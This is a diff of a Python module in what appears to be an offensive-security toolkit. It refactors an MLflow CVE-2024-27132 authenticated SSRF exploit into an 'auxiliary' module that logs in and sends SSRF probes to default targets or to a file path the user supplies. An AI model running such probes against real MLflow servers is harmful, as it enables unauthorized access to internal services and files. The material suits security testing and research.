@@ -2,12 +2,11 @@ from typing import ClassVar
 
 from requests import get
 
+from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
 from flowhound.vulnerabilities.clients.mlflow import MLflowClient
-from flowhound.vulnerabilities.exploits.base_exploit_class import ExploitBaseClass
-from flowhound.vulnerabilities.payloads.base_payload_class import PayloadBaseClass
 
 
-class Exploit(ExploitBaseClass):
+class Auxiliary(AuxiliaryBaseClass):
     """
     CVE-2024-27132 — Authenticated SSRF via the MLflow artifact listing endpoint.
 
@@ -74,25 +73,28 @@ class Exploit(ExploitBaseClass):
 
         return resp.status_code, resp.text
 
-    def exploit(
+    def run(
         self,
         base_url: str,
-        username: str,
-        password: str,
+        f_path: str | None = None,
+        username: str = "",
+        password: str = "",
         proxies: dict[str, str] | None = None,
-        payload: PayloadBaseClass | None = None,
     ) -> bool:
         self.logger.info(
             f"Authenticating as {username!r} for CVE-2024-27132 (authenticated SSRF)..."
         )
-        headers = self.authenticate(
-            base_url=base_url, username=username, password=password, proxies=proxies
+        headers = self.handle_authentication(
+            base_url=base_url,
+            username=username,
+            password=password,
+            proxies=proxies,
         )
 
         if headers is None:
             return False
 
-        targets = [payload.load_payload()] if payload else self._DEFAULT_SSRF_TARGETS
+        targets = [f_path] if f_path else self._DEFAULT_SSRF_TARGETS
 
         for target in targets:
             self.logger.info(f"Sending SSRF probe to: {target!r}")
